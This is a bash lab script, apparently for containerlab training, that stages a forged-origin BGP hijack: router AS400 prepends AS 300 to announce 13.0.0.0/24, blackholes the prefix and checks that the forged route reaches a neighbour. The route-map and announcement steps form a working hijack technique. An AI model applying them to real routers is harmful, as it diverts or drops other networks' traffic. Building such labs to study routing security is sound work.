#!/bin/bash
# Start forged-origin hijack: AS400 announces 13.0.0.0/24 with AS_PATH ending in 300.
set -euo pipefail

find_node() {
  local suffix="$1"
  docker ps --format '{{.Names}}' | grep -E '^clab-.*-'"${suffix}"'$' | head -n1
}

R1="$(find_node r1)"
R4="$(find_node r4)"

if [ -z "$R1" ] || [ -z "$R4" ]; then
  echo "[ERROR] Lab containers not running. Deploy a topology first (containerlab deploy), then retry."
  exit 1
fi

echo "[INFO] R1=$R1"
echo "[INFO] R4=$R4"
echo "[INFO] Injecting forged-origin hijack for 13.0.0.0/24 (AS_PATH: 400 300)"

docker exec -i "$R4" vtysh <<'EOF'
configure terminal
route-map FORGE_AS300_ORIGIN permit 10
 set as-path prepend 300
exit
router bgp 400
 network 13.0.0.0/24
 neighbor 10.14.0.1 route-map FORGE_AS300_ORIGIN out
exit
end
write memory
EOF

docker exec "$R4" ip route add blackhole 13.0.0.0/24 2>/dev/null || true

sleep 15

echo "[INFO] R1 BGP view:" 
OUT=$(docker exec "$R1" vtysh -c "show bgp ipv4 unicast 13.0.0.0/24" 2>/dev/null || true)
echo "$OUT"

if echo "$OUT" | grep -q "400 300" && echo "$OUT" | grep -q "10.14.0.2"; then
  echo "[SUCCESS] Forged-origin route is present on R1 (AS_PATH includes '400 300')."
  exit 0
fi

echo "[FAILED] Forged-origin route did not appear as expected on R1."
exit 1
